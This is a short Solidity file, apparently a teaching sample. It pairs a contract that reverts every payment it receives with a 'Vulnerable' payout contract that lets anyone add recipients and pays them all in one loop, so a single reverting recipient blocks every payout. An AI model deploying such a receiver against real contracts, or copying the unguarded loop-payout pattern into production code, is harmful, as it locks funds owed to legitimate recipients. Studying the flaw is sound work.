// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract MaliciousReceiver {
    receive() external payable {
        revert("Blocking funds");
    }
}

contract Vulnerable {
    address[] public recipients;

    function addRecipient(address _addr) public {
        recipients.push(_addr);
    }

    function payAll() public payable {
        for (uint256 i = 0; i < recipients.length; i++) {
            payable(recipients[i]).transfer(1 ether);
        }
    }
}
